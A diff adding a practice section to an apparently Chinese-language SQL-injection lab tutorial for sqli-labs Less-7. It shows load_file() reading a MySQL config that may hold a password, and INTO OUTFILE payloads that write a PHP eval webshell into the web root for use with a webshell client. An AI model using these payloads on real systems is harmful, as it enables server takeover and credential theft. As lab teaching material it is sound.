@@ -164,3 +164,14 @@ select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)into outfile �
 ```
 
 可以利用该语句将服务器当中的内容导入到web服务器下的目录，这样就可以得到数据了。上述my.ini当中存在password项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。
+
+## 4. 实践练习
+```
+?id=1')) union select 1,2,3 into outfile "C:\\xampp\\htdocs\\sqli-labs-php7\\Less-7\\7.php"--+
+```
+写一句话：     
+```
+?id=1')) union select 1,2,'<?php @eval($_post["mima"])?>' into outfile "C:\\xampp\\htdocs\\sqli-labs-php7\\Less-7\\7.php"--+
+```
+即在Less-7目录下写入7.php文件。
+用菜刀连接即可。
